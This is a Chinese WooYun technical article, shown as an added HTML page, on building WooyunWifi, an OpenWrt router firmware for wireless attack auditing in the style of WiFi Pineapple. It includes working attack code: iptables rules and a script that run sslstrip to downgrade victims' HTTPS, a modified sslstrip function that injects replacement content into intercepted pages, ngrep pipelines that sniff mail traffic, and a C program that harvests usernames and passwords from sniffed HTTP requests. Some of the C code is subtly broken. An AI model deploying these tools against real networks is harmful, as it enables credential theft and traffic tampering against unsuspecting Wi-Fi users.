@@ -1,0 +1,286 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">WooYun WIFI 成长史</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">lxj616</a> <span class="bull">·</span> <time title="2014/10/20 14:32" ui-time="" datetime="2014/10/20 14:32" class="published ng-binding ng-isolate-scope">2014/10/20 14:32</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>第一章：失传的菠萝神话</h1><hr><h2>0x00 前言:</h2><hr><p>WooyunWifi是一款基于Openwrt开发的无线审计测试固件，内置集成了众多著名无线/网络审计工具，并基于Ngrep+sslstrip开发了原创工具及BS架构管理界面。 本系列文章将详细讲解 无线安全、网络安全、嵌入式开发、前端Bootstrap界面设计、后台PHP程序设计、Shell Script编写、C语言有限自动机设计、Python网络编程、Linux高级命令、路由器常识概念 等相关内容</p><blockquote><p>本章概括了WooyunWifi的技术架构以及功能实现理论。</p></blockquote><h2>0x01 菠萝神话：</h2><hr><p>由于wifi pineapple支持的路由器有限（事实上除了它自己销售的那一款，其他的路由器都没办法完全正常运行），因此网上出现了各种“移植”的教程，只为一睹神器真容，然而多数人最终失败，少数人在付出了巨大代价后才勉强成功。 Wifi pineapple自称开源，但事实上并非如此，其公开的源代码陈旧而混乱，也没有充足的文档以供分析。 菠萝神话已经失传，只剩国外垄断销售的黑客路由器与一群心怀不轨的购买者，技术研究的气氛 和 自由公开的精神 早已不见了踪影。 如果你真的好奇大菠萝到底是怎样实现的，如果你真的想看到确凿的技术细节，那么跟我来体验一把求真求实、自由共享的乌云白帽“安全实践”吧 注：根据有关法律法规，我们正在仔细评估并设计该固件的”安全使用”限制，尽管遵守GPL协议，在”安全使用”评估设计完成之前不会公开源代码，也不会向公众发布固件。</p><h2>0x02 架构设计：</h2><hr><p>先展示一下WooyunWifi的架构图（Wooyun Wifi简称Woofi）：</p><p><img alt="enter image description here" img-src="743dad5921289c1a48f7881006ae92d77a64ea6a.jpg"></p><p>1、 PHP+Bootstrap的组合大家已经在乌云靶场项目中见过了，不过由于路由器环境限制和开源工具数据存储特性，经过考虑不使用Mysql数据库存储数据，直接使用文本方式保存数据内容。</p><p>2、 数据处理则考虑到路由器性能问题（大量实时数据包处理）采用C语言自动机实现</p><p>3、 使用Shell编程简化了一些控制配置，fate0修复了一个sslstrip的官方bug</p><p>简而言之，工作流程是这样的：用户登录<code>192.168.16.2</code>，看到uhttpd上的index首页，然后后台PHP处理用户的操作，调用了一些辅助性<code>Shell script</code>，然后比如控制把ngrep抓到的数据实时交给WoofiTools中的mailsniff做数据处理，然后结果以文本形式保存。PHP把文本保存的数据读取处理，结合uhttpd返回给用户页面。</p><p>如果接下来各种程序设计我都是一句话带过然后疯狂贴代码，那么这篇文章也和那些炫耀贴毫无区别了，并无冒犯之意，我也从很多“一句话轻描淡写”博客中学习了很多知识，只不过由于文章细节不清，BUG和失败的次数令我觉得难以忍受……所以，接下来我不仅要告诉大家我是怎样实现的程序，而且要告诉大家我为什么要这样写程序。</p><h2>0x03 实现方案的演变：</h2><hr><p>在我还没有开始设计之前，我考虑过几种实现方案</p><p>1、 基于大菠萝二次开发，修改代码重新编译到其他路由器上。这个当时是我的首选方案，直到我发现大菠萝根本没有完全公开源代码，因此彻底不可行</p><p>2、 集成开源软件，做开源软件的WEB UI和各种前提配置。当时觉得这样完全不比大菠萝二次开发复杂，直到我发现很多开源软件年久失修BUG成群，能修复的尽量修复，修不好的只能重新开发了。</p><p>3、 集成各种必要的library，自己从头开发功能程序，这样很明显会有重复造轮子的浪费，不过由于发现有些开源软件无法正常使用，因此也是没办法的选择，当然我也会把那些能够使用的开源软件加以利用</p><p>于是，本想着改改大菠萝代码就可以了，结果变成了重新集成开源软件做 WEB UI 于是，本想着重新集成开源软件做 WEB UI就可以了，结果需要部分底层工具重新开发</p><p>发生这种情况一方面是由于预研不到位，以及SE对技术难度的预判有误，而导致项目规划和实际执行严重错位，这么巨大的技术难度偏差很可能导致项目流产。 那么这个项目是怎么来的呢？那就要从2014/7/30的下午说起……</p><p>社区里小伙伴发了个思想无比前卫的帖子：Anymous《<a href="http://zone.wooyun.org/content/14162">设想wooyun智能路由改造openwrt</a>》 <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="2acfa3bbcf95a9cf8e8dce90906ace90accdb4a6cdb78bc394b3cf8e8dce9090">[email&#160;protected]</a>，瞌睡龙大人把这个光荣的任务交给了我，我当时想了一下答道：“如果只是改改大菠萝源代码，不会很难” 事实证明，我在没有预研的情况下错判了项目技术难度，看来还有好多的东西要学~</p><p><strong>感想：</strong></p><p>越是看上去简单的事情，做起来就越复杂。事情即使再复杂，只要做完了就会变得简单</p><h2>0x04 工具原理：</h2><hr><p>1、 嗅探使用ngrep+自己写的C语言自动机，以及sslstrip+自己写的C语言自动机</p><p>2、 MITM系列功能使用二次开发过的sslstrip来实现</p><p>3、 无线审计开源工具不用修改，直接做WEB UI就可以了（我又错了，karma把我击败了）</p><p>4、 Karma（未完成）通过建立AP并给任意ssid的请求进行响应和服务，达到劫持的目的</p><p><strong>Karma原理详解：</strong></p><p>首先Karma需要建立一个能够用来劫持用户的AP（比如说利用hostapd），然后对hostapd源码进行patch，使之可以无视请求中的ssid提供服务</p><p><img alt="enter image description here" img-src="19fceed8a7092986dfeccec6232f03f46e5d1060.jpg"></p><p>（默认情况下，若ssid不一致，hostapd会报告异常，因此为了实现karma功能需要hostapd去除ssid检查）</p><p>部分重要patch如下：</p><p><img alt="enter image description here" img-src="0ec3aff6097579923bf9b4384f1398862bd1d597.jpg"></p><p>即如果karma&#95;beacon&#95;respond选项开启则无视ssid的检查，补丁原作者在截图中有显示，我只是把他的针对hostapd 2.0补丁重新做到了hostapd最新版20140603上而已</p><p>PS：制作补丁/使用补丁的方式请参见<a href="http://wiki.openwrt.org/doc/devel/patches">http://wiki.openwrt.org/doc/devel/patches</a></p><p>再PS：在refresh之后一定要记住把生成好的补丁复制出来备份，因为接下来的步骤会把补丁打进源码而删除原补丁文件！！！</p><p>而karma本身程序的运行逻辑是： 首先循环抓无线信号帧（使用了airtap），然后每次抓到信号帧都调用on&#95;probe&#95;request处理，在函数里面首先建立一个链表储存请求的station信息，之后发送响应信号帧</p><p>可惜我没有成功跑起karma主程序，因为airtap调用了libpcap却找不到对应的datalink decoder，暂时找不到解决方案</p><p>我曾经以为我熟悉这些工具的原理，直到开发过程中（以后文章详解）遇到各种问题，才发现要真正的熟悉原理，不仅要知道工具做了什么，而且要知道工具为什么这么做。</p><h2>0x05 Luci的简要分析：</h2><hr><p>我们使用Openwrt自己的Luci进行常规功能的管理，因为Luci自己的功能其实是很强大的。我曾经一度想要在Luci之上开发我们的WooyunWifi WEB界面，但是由于cgi和lua脚本都比较陌生，所以为了敏捷开发，还是选择了PHP 请注意：部分Openwrt版本的Luci不支持网络中继功能（就是作为client连接一个Wifi然后再作为AP播出一个Wifi），我选择的最新barrier_breaker是有这个功能的 另外，Luci依赖uhttpd，因此正好PHP也放在uhttpd上了</p><p>对了，不要自己乱改<code>/etc/config/wireless</code>配置，因为Luci会出BUG</p><h2>0x06 投影至乌云峰会irc上：</h2><hr><p>这个是临时功能，为了乌云峰会设计的，从各种sniff中posturl到服务端，然后fate0在瞌睡龙大人的weechat里做了个python插件，我只是post数据，没有实际参与，因此不知道相关细节。 展示出的代码中没有该功能</p><h1>第二章：路由器的先天技能</h1><hr><h2>0x00 前言:</h2><hr><blockquote><p>本章概括了WooyunWifi基于Openwrt的源码编译及集成方式。</p></blockquote><h2>0x01 编译Openwrt：</h2><p>我使用的是Ubuntu麒麟14.04：</p><p>首先要看官方文档，而不是胡乱百度 http://wiki.openwrt.org/doc/howto/easy.build</p><p>官方文档中的这一句</p><pre><code>svn co -r 36088 svn://svn.openwrt.org/openwrt/branches/attitude_adjustment
+</code></pre><p>是检出36088版的attitude&#95;adjustment分支源码，最新版是trunk，新功能多，支持的芯片多，但是稳定的软件包少。为了支持极路由，我选择的是最新版barrier&#95;breaker分支，不要忘记去掉-r 36088以检出最新版本的源码。</p><pre><code>svn co svn://svn.openwrt.org/openwrt/branches/barrier_breaker
+</code></pre><p>官方文档中的这一句：</p><pre><code>./scripts/feeds update –a
+</code></pre><p>可能会因为国内偶尔连不上googlecode而失败，如果你不需要那些在googlecode上的软件包，你可以无视失败信息进行</p><pre><code>./scripts/feeds install -a
+</code></pre><p>（因为会报告index问题，所以要加-a） 如果正好googlecode上放的是你需要的软件包，请自行寻找连接google的方式吧</p><p>然后</p><pre><code>~/20140818/barrier_breaker$ make menuconfig
+</code></pre><p>进行配置</p><p><img alt="enter image description here" img-src="257246d1c6466bf44a152f8d041eba4204c7601b.jpg"></p><p>第一项是目标芯片型号，不知道自己路由器芯片型号的Google去吧，第二项选项是NAND什么的设置视情况选择，第三项是你的路由器型号，我这里选择了极路由，只有在选对了芯片类型后才会可选，其它选项都比较易懂，如果用到再说</p><p><img alt="enter image description here" img-src="96ef3ebba175e70b78f70ee5709eee5c618f8389.jpg"></p><p>选择编译的软件包时，星号代表编译进固件，M代表编译安装包但不放进固件，内置某些软件包时会自动选中依赖项</p><p>Q：为什么选项里没有我要的软件包？</p><p>A：可能你没feeds update install，也可能是你svn检出的版本不对</p><p>然后就是保存</p><pre><code>make V=s
+</code></pre><p>有很多人喜欢 j4多线程编译，如果你是第一次编译，强烈建议你不要这样做，因为你一旦遇到错误输出的东西比较混乱，查日志很麻烦 然后就是遇到连接错误，重新<code>make V=s</code>，还是连接不上，那就和想办法上国外网站同一个道理，如果校验出错，删掉dl文件夹下的错误文件重新 make V=s，视报错针对性解决</p><p>如果编译完成，会在</p><pre><code>bin/芯片型号/
+</code></pre><p>下面出现编译好的固件 比如：<code>openwrt-ar71xx-generic-hiwifi-hc6361-squashfs-sysupgrade.bin</code> 这就是squashfs的极路由固件</p><p>再比如：<code>openwrt-ar71xx-generic-wndr3800-squashfs-factory.img</code> 这就是squashfs的netgear wndr3800 固件</p><p>刷机方法一般可用路由器后台界面上传固件刷机，也可根据说明书使用TFTP刷机，如果有经验也可以线刷</p><h2>0x02 开源工具的评测：</h2><hr><p>1、 Ngrep：之所以不使用tcpdump是因为ngrep提供了更简便的数据处理和输出，运行时很稳定，用它开发了cookiesniff、passsniff、mailsniff等工具</p><p>2、 Dsniff：密码嗅探不理想，安装它是为了其中的urlsnarf等工具，相对而言还是自己开发的ngrep+各种sniff不丢包更稳定，话说Http的密码它根本嗅探不到啊，不知道是不是我配置的问题。</p><p>3、 SSlstrip：官方版本就存在着BUG，不能运行，多亏fate0挺身而出修复了这个BUG，于是我们的Mitm也可以基于sslstrip设计了</p><p>4、 Ettercap：由于Openwrt官方自带的版本过度古老，因此BUG很多（各种网上已知的bug），不适合做二次开发，因此只集成不做WEB UI。</p><p>5、 Karma：不能够正常使用，需要大量修改（暂未完成）</p><p>6、 Aircrack-ng：还没测试</p><p>7、 Reaver：还没测试</p><h2>0x03 fate0修复sslstrip：</h2><hr><p>使用sslstrip的时候报错：</p><pre><code>exceptions.AttributeError: ClientRequest instance has no attribute 'responseHeaders'
+</code></pre><p>fate0通过对sslstrip源码的检查，发现了sslstrip集成的twisted版本过于古老，因此建议我更新twisted，但是我发现新版本的twisted容量太大，集成到路由器上不现实，因此Openwrt才会一直集成古老版本的twisted（而且发现它还是缩水的）。</p><p>于是只好求fate0改sslstrip代码，fate0调试之后发现了问题所在：</p><pre><code>ServerConnection.py
+
+elif (key.lower() == 'set-cookie'):
+            #import pdb
+            #pdb.set_trace()
+            #self.client.responseHeaders.addRawHeader(key, value)
+            self.client.setHeader("test_key", "test_value")
+            #self.client.setHeader(key, value)
+            self.client.cookies.append(value)
+        else:
+            self.client.setHeader(key, value)
+</code></pre><p>由于<code>#self.client.responseHeaders.addRawHeader(key, value)</code>这一句没有responseHeaders，因此造成<code>exception</code></p><p>那么，sslstrip这样设计的目的是什么呢？我们知道，set-cookie可能会有很多个，而<code>self.client.setHeader(key, value)</code>会毫不犹豫地覆盖掉之前的set-cookie，因此这段代码的目的是addRawHeader实现多个<code>set-cookie header</code></p><p>因此，fate0用<code>self.client.cookies.append(value)</code>实现了这一功能，修复完毕</p><h2>0x04 制作修复后的sslstrip软件包：</h2><hr><p>修改sslstrip的Makefile，改为从本地下载（我搭了个nginx），别忘改md5校验哦</p><p><img alt="enter image description here" img-src="639f175b8286dea965b48b79aa0445764bb87d75.jpg"></p><p>然后把修复后的ServerConnection.py打进压缩包，放在自己nginx即可</p><h2>0x05 制作自己的软件包：</h2><hr><p>请优先参阅官方文档</p><p>例：package/wooyun/wooyunwifi/Makefile</p><pre><code>#
+# Copyright (C) 2011-2012 OpenWrt.org
+#
+# This is free software, licensed under the GNU General Public License v2.
+# See /LICENSE for more information.
+#
+
+include $(TOPDIR)/rules.mk
+
+PKG_NAME:=wooyunwifi
+PKG_RELEASE:=1
+
+include $(INCLUDE_DIR)/package.mk
+
+define Package/wooyunwifi
+  SECTION:=wooyun
+  CATEGORY:=wooyunwifi
+  TITLE:=wooyunwifi
+  MAINTAINER:=lxj616
+endef
+
+define Package/wooyunwifi/description
+ Wooyun Wifi is a whitehat wifi auditing toolsuite based
+ on Openwrt , Have fun testing security issues on your 
+ own wifi network ,serves study purpose only, license GPL
+                                    ------ <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="8ee2f6e4b8bfb8cef9e1e1f7fbe0">[email&#160;protected]</a>
+endef
+
+define Build/Prepare
+    $(INSTALL_DIR) $(PKG_BUILD_DIR)
+    把src里面的源文件复制到build地点（不然编译时找不到）
+    $(INSTALL_DATA) ./src/cookiesniff.c $(PKG_BUILD_DIR)/
+    $(INSTALL_DATA) ./src/passsniff.c $(PKG_BUILD_DIR)/
+    $(INSTALL_DATA) ./src/mailsniff.c $(PKG_BUILD_DIR)/
+    $(INSTALL_DATA) ./src/stripsslstrip.c $(PKG_BUILD_DIR)/
+    把不需要编译的文件夹和文件也拷贝过去
+    $(CP) ./WooyunWifi $(PKG_BUILD_DIR)/
+    $(CP) ./index.html $(PKG_BUILD_DIR)/
+    $(CP) ./conf $(PKG_BUILD_DIR)/
+endef
+
+define Build/Compile
+    编译源文件，如果之前没复制这步就找不到，用的是交叉编译
+    $(TARGET_CC) $(TARGET_CFLAGS) -Wall \
+        -o $(PKG_BUILD_DIR)/cookiesniff $(PKG_BUILD_DIR)/cookiesniff.c
+    $(TARGET_CC) $(TARGET_CFLAGS) -Wall \
+        -o $(PKG_BUILD_DIR)/passsniff $(PKG_BUILD_DIR)/passsniff.c
+    $(TARGET_CC) $(TARGET_CFLAGS) -Wall \
+        -o $(PKG_BUILD_DIR)/mailsniff $(PKG_BUILD_DIR)/mailsniff.c
+    $(TARGET_CC) $(TARGET_CFLAGS) -Wall \
+        -o $(PKG_BUILD_DIR)/stripsslstrip $(PKG_BUILD_DIR)/stripsslstrip.c
+endef
+
+define Package/wooyunwifi/install
+    新建文件夹准备复制
+    $(INSTALL_DIR) $(1)/usr/bin
+    $(INSTALL_DIR) $(1)/etc/wooyunwifi
+    复制编译好的文件到可以运行的地方
+    $(INSTALL_BIN) $(PKG_BUILD_DIR)/cookiesniff $(1)/usr/bin/
+    $(INSTALL_BIN) $(PKG_BUILD_DIR)/passsniff $(1)/usr/bin/
+    $(INSTALL_BIN) $(PKG_BUILD_DIR)/mailsniff $(1)/usr/bin/
+    $(INSTALL_BIN) $(PKG_BUILD_DIR)/stripsslstrip $(1)/usr/bin/
+    $(INSTALL_DIR) $(1)/www
+    直接复制各种文件
+    $(CP) $(PKG_BUILD_DIR)/WooyunWifi $(1)/www
+    $(CP) $(PKG_BUILD_DIR)/index.html $(1)/www
+    $(CP) $(PKG_BUILD_DIR)/conf/basepath.conf $(1)/etc/wooyunwifi
+endef
+
+$(eval $(call BuildPackage,wooyunwifi))
+</code></pre><p>然后再<code>make menuconfig</code>就可以看到自己的软件包了，然后正常编译即可，如果报错注意修改软件包配置</p><h1>第三章：路由器的漂亮界面</h1><hr><h2>0x00 前言:</h2><hr><blockquote><p>本章概括了WooyunWifi的WEB端功能实现。</p></blockquote><h2>0x01 PHP：</h2><hr><p>我曾经考虑，可不可以只用html+cgi实现所有的功能，但考虑到WEB管理的业务需求比较宽松，因此采用PHP敏捷开发更加快速。 Menuconfig时，额外选择<code>language – PHP – php-mod-session</code>用作登录控制，同理可集成其它所需插件 为了使uhttpd支持PHP，修改<code>package/network/services/uhttpd/files/uhttpd.config</code> 去掉<code>list interpreter php</code> 的注释符号，其它配置同理</p><p><img alt="enter image description here" img-src="ce8517b48c665c8a0694c955bceb6e38ce35f20c.jpg"></p><p>以sslstrip插件的设计为例进行说明</p><p><img alt="enter image description here" img-src="1bae96b5f3b7c425a0d7668d490c53f7b0e76a58.jpg"></p><pre><code>/WooyunWifi/sslstrip.inc
+
+$ison=shell_exec("ps|awk '{print $6}'|grep sslstrip");
+</code></pre><p>在PHP中随时使用<code>shell_exec</code>和<code>exec</code>执行linux命令获取工具状态，并且判断显示开关的状态，之后就是常规的PHP程序设计了</p><p>不过在设计中出现了一个小问题，那就是一些命令比如说ngrep在运行时会挂在那里持续运行，这就导致PHP脚本无法继续运行，比较奇怪的是nohup &amp;在php里面没有效果，只有先用PHP <code>sh ***.sh</code>，然后在shell 脚本中才会正常后台执行，因此：</p><p><strong>sson.php</strong></p><pre><code>&lt;script&gt;
+var xmlhttp;
+xmlhttp=new XMLHttpRequest();
+&lt;?php
+echo 'xmlhttp.open("GET","sslstripon.php",true)';
+?&gt;
+xmlhttp.send();
+var t=setTimeout("window.location.href=\"/WooyunWifi/index.php?action=sslstrip\";",1000);
+&lt;/script&gt;
+</code></pre><p>先异步请求，然后等待1s跳转回去（解决后面500 bad gateway问题）</p><p><strong>sslstripon.php</strong></p><pre><code>shell_exec("./test2.sh ".$basepath."&amp;");
+</code></pre><p>接到请求，运行shell脚本（还是会挂在这里不能继续执行）</p><p><strong>Test2.sh</strong></p><pre><code>#!/bin/sh
+
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 10000
+iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-ports 10000
+
+echo "1" &gt; ${1}/sslstrip.log
+sslstrip -w ${1}/sslstrip.log -l 10000 &amp;
+tail -f ${1}/sslstrip.log|stripsslstrip &amp;
+
+kill $(ps|grep "php-cgi"|awk '{print $1}') &amp;
+</code></pre><p>结束掉php-cgi的进程，因为uhttpd是一个单线程服务器，因此php-cgi挂在那里就会导致服务器无响应，kill掉之后服务器才能响应其他请求。</p><p>所以流程是这样的： 1、 用户打开页面 2、 PHP执行shell命令，判断sslstrip是否正在运行，如果不是，返回“启动”按钮 3、 用户点击启动按钮 4、 到sson.php中异步请求sslstripon.php，然后…… 5、 sslstripon.php调用test2.sh，后台运行sslstrip，然后<code>test2.sh</code> <code>kill掉php-cgi</code>，于是sslstripon.php执行完毕（返回500 bad gateway），但是用户在sson.php中等待1s后返回主界面了，所以看不到500错误</p><p>绕了个圈解决了单线程服务器的阻塞问题，不过这样看来软件架构怪怪的，先实现功能再说，以后再改进吧</p><p>大家可能会有这样的疑问： 你在PHP中运行shell命令时难道不是www-data权限吗？ 如何运行tcpdump之类的高权限程序呢？</p><p>其实我之前也特地设计了用sudoer解决权限问题的方案，只不过后来我发现（个人猜测），Openwrt这类的嵌入式系统权限和用户组并不严格，直接就是root运行一切程序了</p><h2>0x02 Bootstrap前端设计：</h2><hr><p><a href="http://www.layoutit.com/build?r=35144450">在线</a>画了个框架，然后放在路由器上一边vi一边刷新浏览器</p><p><img alt="enter image description here" img-src="1b6a8aea304dccadf69a79645945095f29c622d8.jpg"></p><h2>0x03 MITM功能设计：</h2><hr><p>因为这个功能主要是在应用层实现的，而且和WEB相关协议联系比较密切，所以放在WEB层来探讨这个问题。 首先我们来分析一下解决这个功能的可选方案：</p><p>1、 在传输层使用transparent proxy做MITM数据包截取/修改 2、 在应用层使用HTTP双向通信模型做MITM内容截取/修改</p><p>刚开始的思路是做一个<code>transparent proxy</code>，但是发现由于数据包分段以及gzip格式传输，导致传输层做HTTP内容注入比较复杂，而且其他协议的数据包又不具备通用性的MITM介入方式，因此综合看来还是做应用层HTTP协议的双向通信模型比较简便。</p><p>而我们知道，SSlstrip就是基于这种应用层双向通信模型构建的，我们可以借用SSlstrip的代码进行改造</p><pre><code>ServerConnection.py
+
+    def replaceSecureLinks(self, data):
+        iterator = re.finditer(ServerConnection.urlExpression, data)
+
+        for match in iterator:
+            url = match.group()
+
+            logging.debug("Found secure reference: " + url)
+
+            url = url.replace('https://', 'http://', 1)
+            url = url.replace('&amp;amp;', '&amp;')
+            self.urlMonitor.addSecureLink(self.client.getClientIP(), url)
+
+        data = re.sub(ServerConnection.urlExplicitPort, r'http://\1/', data)
+
+        #在这里对data进行处理，即可完成MITM介入
+        #这个函数本来的功能是替换https为http普通链接
+        #在此之前已经完成了对gzip的解压，以及建立了双向连接
+
+        replaceconfig=os.popen('cat /etc/wooyunwifi/replace.conf').readlines()
+        data = data.replace(replaceconfig[0].strip(),replaceconfig[1].strip())
+
+        #其实就两句话，看上去很简单，哈
+
+        return re.sub(ServerConnection.urlType, 'http://', data)
+</code></pre><p>再做个WEB页面 至此，MITM设计完毕</p><p>感想：写一句代码只需要一分钟，但知道这行代码写在哪需要一天</p><p><img alt="enter image description here" img-src="fb199068e29c982612adf13606e7ed1611adcea6.jpg"></p><p>既然WEB控制端设计好了，开始做model层的数据处理工具吧！</p><h1>第四章：路由器的数据处理</h1><hr><h2>0x00 前言:</h2><hr><blockquote><p>本章概括了WooyunWifi的model层数据处理功能实现。</p></blockquote><h2>0x01 交叉编译：</h2><hr><p>我们在本地编译一个Linux程序：</p><pre><code>gcc -o mailsniff mailsniff.c
+./mailsniff.c 
+</code></pre><p>在本地可以正常运行</p><p>而我们要编译一个在路由器上可以运行的程序，又不能给路由器安装gcc，那怎么办呢？</p><p>我们采取交叉编译在本地编译路由器中的程序：</p><pre><code>./barrier_breaker/staging_dir/toolchain-mips_34kc_gcc-4.8-linaro_uClibc-0.9.33.2/bin/mips-openwrt-linux-gcc -o mailsniff mailsniff.c
+</code></pre><p>这里的交叉编译工具链跟你的路由器芯片型号有关，需要你先选择toolchains编译make V=s后才会出现，当然你也可以从downloads.openwrt.org直接下载对应芯片型号的toolchains</p><p>如何制作软件包集成进固件在第二章介绍，此处不再赘述</p><h2>0x02 数据交互：</h2><hr><p>实例说明：</p><pre><code>echo "1" &gt; ${1}/sslstrip.log
+</code></pre><p>将echo的结果写入文件（basepath从外部PHP调用传入）</p><pre><code>ngrep -l -q -W byline -d $1 port 110 or 143 or 25|mailsniff
+</code></pre><p>将ngrep的stdout接到mailsniff的stdin上（device从外部PHP调用传入）</p><p>注意：这里的ngrep -l 选项是为了使ngrep的stdout以行为单位缓冲，避免由于数据缓冲导致的数据不及时同步问题</p><p>而sslstrip本身是输出一个log文件</p><pre><code>sslstrip -w ${1}/sslstrip.log -l 10000 &amp; 
+tail -f ${1}/sslstrip.log|stripsslstrip &amp;
+</code></pre><p>使用tail就可以实现实时输出</p><h2>0x03 自动机设计：</h2><hr><p>以passsniff为例介绍C语言自动机设计：</p><pre><code>/*
+    code by <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="096571633f383f497e6666707c67">[email&#160;protected]</a>
+*/
+#include &lt;stdlib.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;arpa/inet.h&gt;
+#include &lt;netdb.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+
+//Openwrt默认权限可以读写etc下文件
+void get_basepath(char *basepath)
+{
+    FILE *fp1;
+    fp1 = fopen("/etc/wooyunwifi/basepath.conf","r");
+    fscanf(fp1,"%s",basepath);  
+    fclose(fp1);
+}
+
+//解析URL中用户名和密码
+void strip_pass(char *basepath,char *buffer,char *host)
+{
+    int i;
+    int flag=0;
+    char *user;
+    char *pass;
+    user=strstr(buffer,"user");
+    pass=strstr(buffer,"pass");
+
+    if(user&amp;&amp;pass)
+    {
+        user=strstr(user,"=")+1;
+        pass=strstr(pass,"=")+1;
+
+        for(i=0;user[i]!='\0'&amp;&amp;flag==0;i++)
+        {
+            if(user[i]=='&amp;')
+            {
+                user[i]='\0';
+                flag=1;
+            }
+        }
+        flag=0;
+        for(i=0;pass[i]!='\0'&amp;&amp;flag==0;i++)
+        {
+            if(pass[i]=='&amp;')
+            {
+                pass[i]='\0';
+                flag=1;
+            }
+        }
+    }
+    else 
+    {
+        strcpy(user,"unknown");     strcpy(pass,"unknown");     }   update_log(basepath,host,user,pass); } 
+//写文本文件保存信息
+void writeLog(char *path,char *user,char *pass)
+{
+    FILE *fp = fopen(path,"a");
+    fputs("\r\n",fp);
+    fputs(user,fp);
+    fputs("\r\n",fp)
+    fputs(pass,fp);
+    fputs("\r\n",fp);
+    fflush(stdout);
+    fclose(fp);
+}
+
+//写文件，以host命名，因为是直接读的Host: ***.com，因此去掉前面的前缀
+void update_log(char *basepath,char *host,char *user,char *pass)
+{
+    char tmppath[1629];
+    strcpy(tmppath,basepath);
+    strcat(tmppath,"/passdump/");
+    writeLog(strcat(tmppath,host+6),user,pass);
+}
+
+
+int main()
+{
+    char basepath2[128];
+    char basepath[128];
+    char buffer[1629]="0";
+    char pass[1629]="0";
+    char pass2[1629]="0";
+    char host[1629]="0";
+    char host2[1629]="0";
+    int flag=0;
+
+    char mkdir[128]="mkdir "; 
+
+    get_basepath(basepath);
+
+    strcat(mkdir,basepath);
+    strcat(mkdir,"/passdump");
+
+    //先保证存在保存的文件夹
+    system(mkdir);
+
+    while(1)
+    {
+        fgets(buffer,1628,stdin);
+        //如果是空行，代表一个数据包结束 或者 紧接着POST内容
+        if(strcmp(buffer,"\n")==0)
+        {
+            //已经出现了记录？写文件然后清空当前密码记录
+            if((strcmp(host,"0")!=0)&amp;&amp;(strcmp(pass,"0")!=0))
+            {
+                //干掉referer，免得一个密码记录好多次
+                if(!strstr(pass,"Referer:"))
+                {
+                    strip_pass(basepath,pass,host);
+                    printf("\n\n");
+                }
+                strcpy(pass,"0");
+            }
+        }
+        else if(strstr(buffer,"Host:"))
+        {
+            //去掉0x0a和0x0d
+            buffer[strlen(buffer)-2]='\0';
+            strcpy(host,buffer);
+        }
+        else if(strstr(buffer,"user")&amp;&amp;strstr(buffer,"pass"))
+        {
+            //去掉0x0a和0x0d
+            buffer[strlen(buffer)-2]='\0';
+            strcpy(pass,buffer);
+        }
+        //buffer[strlen(buffer)-2]='\0';
+    }
+    return 0;
+}
+</code></pre><p>概括起来我们的自动机做了以下事情：</p><p>1、 Ngrep嗅探PHP指定的device数据包，筛选80端口HTTP请求，然后把stdout转接到我们的自动机stdin上 2、 C语言自动机不断按行读取stdin中的输入，不停检测密码信息以及Host信息，但数据包结束后，判断是否截获密码信息，如果是，追加写入文本记录文件 3、 自动机本身不会停止工作，必须依靠PHP+Shellscript来外部kill掉</p><h2>0x04 为什么不用python：</h2><hr><p>字符处理，还是python方便，但是我们真的很需要“效率”，无论是从内存占用还是数据包延迟来说，C语言仍然占据了不可替代的优势（其实也没那么悬殊，只不过自动机程序比较简单，因此对C熟练的话不会很吃力） 还有一个重要的原因是：当初我以为会涉及到kernel的数据包修改，后来写完自动机才发现原来想多了，所以C语言反倒只用来写了几个自动机，唉……</p><h2>0x05 使用iptables重定向流量</h2><p>例：</p><pre><code>iptables -t nat -A PREROUTING -s 192.168.16.249 -p tcp --dport 80 -j DNAT --to-destination 192.168.16.134:8029
+iptables -t nat -A POSTROUTING -p tcp -d 192.168.16.134 --dport 80 -j MASQUERADE
+iptables -t nat -A POSTROUTING -p tcp -d 192.168.16.134 --dport 8029 -j MASQUERADE
+</code></pre><p>由此一方面可以将流量重定向到自己的proxy上（是transparrent proxy），也可以直接转发到其他ip（如burpsuite）</p><p>至此，WooyunWifi设计完成，大家可能会觉得“哇，还是很简单的嘛”，如果大家真的打算试一下全过程，请务必要看《WooyunWifi 第五章：十万个变砖方法》</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/tips/6919" rel="bookmark" id="re1">太极越狱重大安全后门</a></li><li><a href="http://drops.wooyun.org/tips/5535" rel="bookmark" id="re2">wargame narnia writeup</a></li><li><a href="http://drops.wooyun.org/tips/2839" rel="bookmark" id="re3">短域名进化史</a></li><li><a href="http://drops.wooyun.org/tips/7299" rel="bookmark" id="re4">MySQL注入技巧</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">orangleliu</span> <span class="reply-time">2016-04-26 15:24:40</span></div><p></p><p>我是用 tcpdump+lua来写的，抓url</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">夜未央</span> <span class="reply-time">2015-05-14 14:42:50</span></div><p></p><p>楼主大大，能私下聊下吗？<br>对这个非常感兴趣，想一起交流一下？<br><a class="__cf_email__" href="/cdn-cgi/l/email-protection" 